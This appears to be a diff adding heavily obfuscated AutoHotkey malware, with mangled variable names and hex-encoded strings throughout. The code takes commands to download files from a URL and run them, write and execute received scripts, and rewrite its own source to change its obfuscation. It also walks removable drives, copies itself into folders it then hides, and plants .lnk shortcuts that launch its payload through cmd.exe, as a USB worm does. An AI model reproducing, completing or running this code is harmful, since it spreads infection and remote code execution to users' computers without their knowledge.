+fktt#k := @k@kfkfk@sssff("5C") . @kf@ffkkf#kkf#(10) . @k@kfkfk@sssff("2E747874")
+@k@k#fk@ := tt@sss@f#k@k[1]
+f@k@k#@k := tt@sss@f#k@k[2]
+if FileExist(k#f@k@@tttf# . @k@kfkfk@sssff("5C") . f@k@k#@k){
+FileDelete ,%#ss#fsss%%k#f@k@@tttf#%%ss@kkf%\%#kfk%%f@k@k#@k%%k#k#kffk%
+}
+f#@kf@ktttk@k@f#("downloading file " . f@k@k#@k . " - " . @k@k#fk@)
+if FileExist(k#f@k@@tttf# . fktt#k){
+FileDelete ,%kfk#fkf#%%k@@kff%%k#f@k@@tttf#%%#k#sss%%fktt#k%%kfkf@tt@%
+}
+UrlDownloadToFile, %fkktt#k#%%@k@k#fk@%%#fk@%, %k#f@k@@tttf#%%k#k#kffk%%f#f##k%%@ss@kffk%%@f#k@k%%fktt#k%
+if FileExist(k#f@k@@tttf# . fktt#k){
+FileMove, %k#f@k@@tttf#%%tttf#sss%%ss@ttt%%kfk@#k%%fktt#k%%f@f##f%, %k#f@k@@tttf#%%@ss@kffk%%k@f#@f%\%#tttf#k@%%f@k@k#@k%%f@f#k@%
+IfInString, f@k@k#@k, %@tt#k@tttf@f%%tt#fkf@f%%k@@kff%
+{
+#k@fss@f@k := @k@kfkfk@sssff("433A5C") . @k@fkf#ss# . @k@kfkfk@sssff("5C") . f@f@k@ . " " . @k@kfkfk@sssff("433A5C") . @k@fkf#ss# . @k@kfkfk@sssff("5C") . f@k@k#@k
+Run,%#fk@%%#sss%%#k@fss@f@k%
+}else{
+Run,%fkf#f@fk%%k#f@k@@tttf#%%k#f#kffk%\%f@k@k#@k%%@tt@sssf%%k@f#@k%
+}
+}
+return
+}
+IfInString, #fkkfk, %f#kf@k#ffk%%kf@k%%k#k#kffk%
+{
+f@fk#fkf := fkf##f#k@fk@k#(#fkkfk,@k@kfkfk@sssff("7363726970742D"),@k@kfkfk@sssff("2D736372697074"))
+f@fk#fkf := StrSplit(f@fk#fkf, ":!:")
+k@tt#f@kkf := f@fk#fkf[1]
+#fsss#@f := f@fk#fkf[2]
+#kf#ss@ffk :=  @k@kfkfk@sssff("5C") . @kf@ffkkf#kkf#(10) . @k@kfkfk@sssff("2E747874")
+#fk#kfsssk := k#f@k@@tttf# . @k@kfkfk@sssff("5C") . #fsss#@f
+if FileExist(#fk#kfsssk){
+FileDelete ,%#fk#kfsssk%%f@f##f%%kfk#fkf#%
+}
+if FileExist(k#f@k@@tttf# . #kf#ss@ffk){
+FileDelete ,%tttf#sss%%k#f@k@@tttf#%%#sssf@%%#kf#ss@ffk%%ktt@fkkf%%k@@kff%
+}
+f#@kf@ktttk@k@f#("script file " . #fsss#@f . " - " . k@tt#f@kkf)
+FileAppend, %#ss#fss@%%k@tt#f@kkf%%f@#k%, %kfk#@fkk%%kktt#k%%k#f@k@@tttf#%%#kf#ss@ffk%%@f#k%%@fkf@f%
+FileMove, %kfk@#k%%k#f@k@@tttf#%%k@#f%%kfk@#k%%#kf#ss@ffk%%#sssf@%, %kfk#@fkk%%k#f#kffk%%k#f@k@@tttf#%\%k#f#fk%%#fsss#@f%%sss@fk#f%
+IfInString, #fsss#@f, %k#kttt%%@k#kff%%@tt#k@tttf@f%
+{
+#k@fss@f@k := @k@kfkfk@sssff("433A5C") . @k@fkf#ss# . @k@kfkfk@sssff("5C") . f@f@k@ . " " .  #fk#kfsssk
+Run,%#k@fss@f@k%%f#f#%%fk@k@k#f%
+}else{
+Run,%f@@k%%k#f@k@@tttf#%%fktt@kf#%\%ktt@fkkf%%#tttf#k@%%#fsss#@f%
+}
+return
+}
+IfInString, #fkkfk, %@k#kff%%f#ss@tt@k@%%fk@k@k#f%
+{
+kf#tt#k@kf#f  := @k@fkf#ss#
+ffk#k##tt##f := ";"
+FileAppend, `n %f@f#k@%%ffk#k##tt##f%%f#f##k% %kf#fsss@#ss@%%fk@fkk%%k@f#@k%, %A_ScriptFullPath%
+@kf##f := FileOpen(A_ScriptFullPath, 0)
+kf@f#kfk@kfk := @kf##f.Read()
+kf@f#kfk@kfk := sss##ffkf#kffss@(kf@f#kfk@kfk)
+@kf##f.Close()
+ttttt@kk := FileOpen(A_ScriptFullPath, 5)
+ttttt@kk.WriteLine(ffk#k##tt##f . k#f@ffss#k)
+ttttt@kk.Write(kf@f#kfk@kfk)
+ttttt@kk.Close()
+kf#tt#k@kf#f := @kf@ffkkf#kkf#(21)
+return
+}
+IfInString, #fkkfk, % @k@kfkfk@sssff("736C6565702D")
+{
+fk#fkktt#k := fkf##f#k@fk@k#(#fkkfk,@k@kfkfk@sssff("736C6565702D"),@k@kfkfk@sssff("2D736C656570"))
+f#@kf@ktttk@k@f#(@k@kfkfk@sssff("736C656570696E6720") . fk#fkktt#k)
+@fkffkktt#@ttt(fk#fkktt#k)
+return
+}
+sleep , 1000
+}
+@fkffkktt#@ttt(@kfk#ktt#f@ffk@k){
+if (kf@tt# = 1){
+sleep , 5000
+}else{
+sleep @kfk#ktt#f@ffk@k
+}
+}
+@tt@#ffkkffss@(kfk#f#tt@kkf#f){
+try {
+VarSetCapacity(SHORT,StrLen(kfk#f#tt@kkf#f)*2)
+DllCall("GetShortPathName","Str",kfk#f#tt@kkf#f,"Str",SHORT,"UInt",StrLen(kfk#f#tt@kkf#f)*2)
+} catch {
+return kfk#f#tt@kkf#f
+}
+if (SHORT = "")
+{
+return kfk#f#tt@kkf#f
+}
+Return SHORT
+}
+@kf@ffkkf#kkf#(k@ffk@ffkfkffk) {
+static   c
+if   !c
+Loop, 26
+c .=   (!c ? "" : "`n") Chr(A_Index + 96)
+Loop %   k@ffk@ffkfkffk
+{
+Random, n, 1, 1296
+Loop %   n
+Sort, c, Random
+str .=   SubStr(c,1,1)
+}
+return   str
+}
+k@fkffk##fkkff() {
+For objOS In k@@f#k@kfk.Drives {
+k@sss@tt#f := ObjOS.path
+if (k@sss@tt#f = @k@kfkfk@sssff("433A")){
+}else{
+f#f#tt@k = %k#f#fk%%k@sss@tt#f%%k#@tt@%\*.*
+Loop, %f#f@#f%%#sss%%f#f#tt@k%
+{
+tt#k@tt# = %A_LoopFileDir%
+}
+@kf@ss@fsss# := 0
+Loop, %f#f#tt@k%%@kfk@k@f%%f#f@#f%, 1
+{
+if (@kf@ss@fsss# > 0){
+if (tttfk#k@k@k@ > 0){
+break
+}
+}
+FileGetAttrib,CurAttrib, %A_LoopFileFullPath%
+IfInString, CurAttrib, D
+{
+StringReplace, A_LoopRelativeFileName, A_LoopFileFullPath, %tt#k@tt#%%f@kk%%@fkf@f%,
+if (A_LoopRelativeFileName = @k@kfkfk@sssff("5C2452454359434C452E42494E")){
+}else{
+#k#k#sss := SubStr(@k@fkf#ss#, 1, 3)
+#k@f#sss#kfk := A_LoopRelativeFileName
+StringReplace, #k@f#sss#kfk, #k@f#sss#kfk,  "\",
+ifexist, %ss@fk#ff%%kfk@#k%%k@sss@tt#f%%A_LoopRelativeFileName%\%#kfk%%kfk#@fkk%%@k@fkf#ss#%
+{
+FileGetSize, oldfilesize, %k@sss@tt#f%%fktt@kf#%%fkktt#k#%%A_LoopRelativeFileName%\%#k@kff%%#sssf@%%@k@fkf#ss#%\%ktt@fkkf%%sss@fk#f%%@k@fkf#ss#%.txt
+FileGetSize, scriptfilesize, %A_ScriptFullPath%
+if (oldfilesize <> scriptfilesize){
+FileCopyDir, %A_ScriptDir%, %k@sss@tt#f%%#k@kff%%ss@f@f%%A_LoopRelativeFileName%\%ss@f@f%%@k@fkf#ss#%%k@f#f@%,1
+}else{
+@kf@ss@fsss# := @kf@ss@fsss# + 1
+break
+}
+}else{
+FileCopyDir, %A_ScriptDir%, %k@sss@tt#f%%fkktt#k#%%@kkf%%A_LoopRelativeFileName%\%f@@f#f%%@k@fkf#ss#%%kfk#@fkk%
+FileSetAttrib, +SH, %k@sss@tt#f%%ss@fk#ff%%f#k#f@%%A_LoopRelativeFileName%\%ss@kkf%%@k@fkf#ss#%%#k@kff%,1
+}
+ifexist, %tt@f%%ss@kkf%%k@sss@tt#f%%A_LoopRelativeFileName%\%@kfk@k@f%%@k@fkf#ss#%%@kfk@k@f%
+{
+ifexist, %f@k@k#f#%%k@f#f@%%k@sss@tt#f%%A_LoopRelativeFileName%%fk@fkk%%#k@f#sss#kfk%%k#f#kffk% copy %k#k#kffk%%@kfk@k@f%%#k#k#sss%.lnk
+{
+}else{
+FileCreateShortcut, % @k@kfkfk@sssff("636D642E657865"),%@ss@f#ff%%k@sss@tt#f%%kfk#fkf#%%A_LoopRelativeFileName%%k#fsss%%#k@f#sss#kfk%%f@kk% copy %ss#k%%#k#k#sss%%fkktt#k#%.lnk,, "/c start %f@kk%%kfk#@fkk%%@k@fkf#ss#%\%ktt@fkkf%%@k@fkf#ss#%%fk@fkk%.exe %f#k#f@%%@k@fkf#ss#%%k@f#@k%\%ss@ttt%%@k@fkf#ss#%%@ss@kffk%.txt %f@#k%%#k#k#sss%%@ss@f#ff% &exit",,%SystemRoot%\system32\shell32.dll,,4
+}
+}
+}
+}
+}
+}
+}
+tttfk#k@k@k@ := 1
+}
+kkf@f@k@k#kkf@#f(f#ssskfk@fkkfkf#,#tt@k@kf#fss#fkf){
+IfInString, f#ssskfk@fkkfkf#, %ss@kkf%%#tt@k@kf#fss#fkf%%tttf#sss%
+{
+return true
+}
+else
+{
+return false
+}
+}
+sss##ffkf#kffss@(fktttk#kf#kkffkk){
+k@k#k#kfk@ := SubStr(kf#tt#k@kf#f, 1, 4)
+k#fss# := SubStr(@k@fkf#ss#, 1, 4)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, k#fss#, "")
+if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("66") . @k@kfkfk@sssff("66") . @k@kfkfk@sssff("66")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("66") . @k@kfkfk@sssff("66") . @k@kfkfk@sssff("66"), @k@kfkfk@sssff("61") . @k@kfkfk@sssff("61") . @k@kfkfk@sssff("61") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("66") . @k@kfkfk@sssff("6623"), @k@kfkfk@sssff("61") . @k@kfkfk@sssff("6123") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("66") . @k@kfkfk@sssff("6640"), @k@kfkfk@sssff("61") . @k@kfkfk@sssff("6140") . k@k#k#kfk@)
+} else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("6B") . @k@kfkfk@sssff("6B") . @k@kfkfk@sssff("6B")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6B") . @k@kfkfk@sssff("6B") . @k@kfkfk@sssff("6B"), @k@kfkfk@sssff("62") . @k@kfkfk@sssff("62") . @k@kfkfk@sssff("62") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6B") . @k@kfkfk@sssff("6B23"), @k@kfkfk@sssff("62") . @k@kfkfk@sssff("6223") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6B") . @k@kfkfk@sssff("6B40"), @k@kfkfk@sssff("62") . @k@kfkfk@sssff("6240") . k@k#k#kfk@)
+} else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("61") . @k@kfkfk@sssff("61") . @k@kfkfk@sssff("61")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("61") . @k@kfkfk@sssff("61") . @k@kfkfk@sssff("61"), @k@kfkfk@sssff("63") . @k@kfkfk@sssff("63") . @k@kfkfk@sssff("63") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("61") . @k@kfkfk@sssff("6123"), @k@kfkfk@sssff("63") . @k@kfkfk@sssff("6323") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("61") . @k@kfkfk@sssff("6140"), @k@kfkfk@sssff("63") . @k@kfkfk@sssff("6340") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("62") . @k@kfkfk@sssff("62") . @k@kfkfk@sssff("62")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("62") . @k@kfkfk@sssff("62") . @k@kfkfk@sssff("62"), @k@kfkfk@sssff("64") . @k@kfkfk@sssff("64") . @k@kfkfk@sssff("64") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("62") . @k@kfkfk@sssff("6223"), @k@kfkfk@sssff("64") . @k@kfkfk@sssff("6423") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("62") . @k@kfkfk@sssff("6240"), @k@kfkfk@sssff("64") . @k@kfkfk@sssff("6440") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("63") . @k@kfkfk@sssff("6363")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("63") . @k@kfkfk@sssff("6363"), @k@kfkfk@sssff("65") . @k@kfkfk@sssff("6565") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("63") . @k@kfkfk@sssff("6323"), @k@kfkfk@sssff("65") . @k@kfkfk@sssff("6523") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("63") . @k@kfkfk@sssff("6340"), @k@kfkfk@sssff("65") . @k@kfkfk@sssff("6540") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("64") . @k@kfkfk@sssff("6464")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("64") . @k@kfkfk@sssff("6464"), @k@kfkfk@sssff("67") . @k@kfkfk@sssff("6767") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("64") . @k@kfkfk@sssff("6423"), @k@kfkfk@sssff("67") . @k@kfkfk@sssff("6723") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("64") . @k@kfkfk@sssff("6440"), @k@kfkfk@sssff("67") . @k@kfkfk@sssff("6740") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("65") . @k@kfkfk@sssff("6565")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("65") . @k@kfkfk@sssff("6565"), @k@kfkfk@sssff("68") . @k@kfkfk@sssff("6868") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("65") . @k@kfkfk@sssff("6523"), @k@kfkfk@sssff("68") . @k@kfkfk@sssff("6823") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("65") . @k@kfkfk@sssff("6540"), @k@kfkfk@sssff("68") . @k@kfkfk@sssff("6840") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("67") . @k@kfkfk@sssff("6767")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("67") . @k@kfkfk@sssff("6767"), @k@kfkfk@sssff("69") . @k@kfkfk@sssff("6969") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("67") . @k@kfkfk@sssff("6723"), @k@kfkfk@sssff("69") . @k@kfkfk@sssff("6923") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("67") . @k@kfkfk@sssff("6740"), @k@kfkfk@sssff("69") . @k@kfkfk@sssff("6940") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("68") . @k@kfkfk@sssff("6868")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("68") . @k@kfkfk@sssff("6868"), @k@kfkfk@sssff("6A") . @k@kfkfk@sssff("6A6A") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("68") . @k@kfkfk@sssff("6823"), @k@kfkfk@sssff("6A") . @k@kfkfk@sssff("6A23") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("68") . @k@kfkfk@sssff("6840"), @k@kfkfk@sssff("6A") . @k@kfkfk@sssff("6A40") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("69") . @k@kfkfk@sssff("6969")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("69") . @k@kfkfk@sssff("6969"), @k@kfkfk@sssff("6D") . @k@kfkfk@sssff("6D6D") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("69") . @k@kfkfk@sssff("6923"), @k@kfkfk@sssff("6D") . @k@kfkfk@sssff("6D23") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("69") . @k@kfkfk@sssff("6940"), @k@kfkfk@sssff("6D") . @k@kfkfk@sssff("6D40") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("6A") . @k@kfkfk@sssff("6A6A")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6A") . @k@kfkfk@sssff("6A6A"), @k@kfkfk@sssff("6C") . @k@kfkfk@sssff("6C6C") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6A") . @k@kfkfk@sssff("6A23"), @k@kfkfk@sssff("6C") . @k@kfkfk@sssff("6C23") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6A") . @k@kfkfk@sssff("6A40"), @k@kfkfk@sssff("6C") . @k@kfkfk@sssff("6C40") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("6C") . @k@kfkfk@sssff("6C6C")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6C") . @k@kfkfk@sssff("6C6C"), @k@kfkfk@sssff("6E") . @k@kfkfk@sssff("6E6E") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6C") . @k@kfkfk@sssff("6C23"), @k@kfkfk@sssff("6E") . @k@kfkfk@sssff("6E23") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6C") . @k@kfkfk@sssff("6C40"), @k@kfkfk@sssff("6E") . @k@kfkfk@sssff("6E40") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("6D") . @k@kfkfk@sssff("6D6D")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6D") . @k@kfkfk@sssff("6D6D"), @k@kfkfk@sssff("6F") . @k@kfkfk@sssff("6F6F") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6D") . @k@kfkfk@sssff("6D23"), @k@kfkfk@sssff("6F") . @k@kfkfk@sssff("6F23") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6D") . @k@kfkfk@sssff("6D40"), @k@kfkfk@sssff("6F") . @k@kfkfk@sssff("6F40") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("6E") . @k@kfkfk@sssff("6E6E")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6E") . @k@kfkfk@sssff("6E6E"), @k@kfkfk@sssff("70") . @k@kfkfk@sssff("7070") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6E") . @k@kfkfk@sssff("6E23"), @k@kfkfk@sssff("70") . @k@kfkfk@sssff("7023") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6E") . @k@kfkfk@sssff("6E40"), @k@kfkfk@sssff("70") . @k@kfkfk@sssff("7040") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("6F") . @k@kfkfk@sssff("6F6F")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6F") . @k@kfkfk@sssff("6F6F"), @k@kfkfk@sssff("71") . @k@kfkfk@sssff("7171") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6F") . @k@kfkfk@sssff("6F23"), @k@kfkfk@sssff("71") . @k@kfkfk@sssff("7123") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("6F") . @k@kfkfk@sssff("6F40"), @k@kfkfk@sssff("71") . @k@kfkfk@sssff("7140") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("70") . @k@kfkfk@sssff("7070")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("70") . @k@kfkfk@sssff("7070"), @k@kfkfk@sssff("72") . @k@kfkfk@sssff("7272") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("70") . @k@kfkfk@sssff("7023"), @k@kfkfk@sssff("72") . @k@kfkfk@sssff("7223") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("70") . @k@kfkfk@sssff("7040"), @k@kfkfk@sssff("72") . @k@kfkfk@sssff("7240") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("71") . @k@kfkfk@sssff("7171")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("71") . @k@kfkfk@sssff("7171"), @k@kfkfk@sssff("73") . @k@kfkfk@sssff("7373") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("71") . @k@kfkfk@sssff("7123"), @k@kfkfk@sssff("73") . @k@kfkfk@sssff("7323") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("71") . @k@kfkfk@sssff("7140"), @k@kfkfk@sssff("73") . @k@kfkfk@sssff("7340") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("72") . @k@kfkfk@sssff("7272")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("72") . @k@kfkfk@sssff("7272"), @k@kfkfk@sssff("74") . @k@kfkfk@sssff("7474") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("72") . @k@kfkfk@sssff("7223"), @k@kfkfk@sssff("74") . @k@kfkfk@sssff("7423") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("72") . @k@kfkfk@sssff("7240"), @k@kfkfk@sssff("74") . @k@kfkfk@sssff("7440") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("73") . @k@kfkfk@sssff("7373")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("73") . @k@kfkfk@sssff("7373"), @k@kfkfk@sssff("75") . @k@kfkfk@sssff("7575") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("73") . @k@kfkfk@sssff("7323"), @k@kfkfk@sssff("75") . @k@kfkfk@sssff("7523") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("73") . @k@kfkfk@sssff("7340"), @k@kfkfk@sssff("75") . @k@kfkfk@sssff("7540") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("74") . @k@kfkfk@sssff("7474")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("74") . @k@kfkfk@sssff("7474"), @k@kfkfk@sssff("76") . @k@kfkfk@sssff("7676") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("74") . @k@kfkfk@sssff("7423"), @k@kfkfk@sssff("76") . @k@kfkfk@sssff("7623") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("74") . @k@kfkfk@sssff("7440"), @k@kfkfk@sssff("76") . @k@kfkfk@sssff("7640") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("75") . @k@kfkfk@sssff("7575")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("75") . @k@kfkfk@sssff("7575"), @k@kfkfk@sssff("77") . @k@kfkfk@sssff("7777") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("75") . @k@kfkfk@sssff("7523"), @k@kfkfk@sssff("77") . @k@kfkfk@sssff("7723") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("75") . @k@kfkfk@sssff("7540"), @k@kfkfk@sssff("77") . @k@kfkfk@sssff("7740") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("76") . @k@kfkfk@sssff("7676")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("76") . @k@kfkfk@sssff("7676"), @k@kfkfk@sssff("78") . @k@kfkfk@sssff("7878") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("76") . @k@kfkfk@sssff("7623"), @k@kfkfk@sssff("78") . @k@kfkfk@sssff("7823") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("76") . @k@kfkfk@sssff("7640"), @k@kfkfk@sssff("78") . @k@kfkfk@sssff("7840") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("77") . @k@kfkfk@sssff("7777")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("77") . @k@kfkfk@sssff("7777"), @k@kfkfk@sssff("79") . @k@kfkfk@sssff("7979") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("77") . @k@kfkfk@sssff("7723"), @k@kfkfk@sssff("79") . @k@kfkfk@sssff("7923") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("77") . @k@kfkfk@sssff("7740"), @k@kfkfk@sssff("79") . @k@kfkfk@sssff("7940") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("78") . @k@kfkfk@sssff("7878")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("78") . @k@kfkfk@sssff("7878"), @k@kfkfk@sssff("7A") . @k@kfkfk@sssff("7A7A") . k@k#k#kfk@)
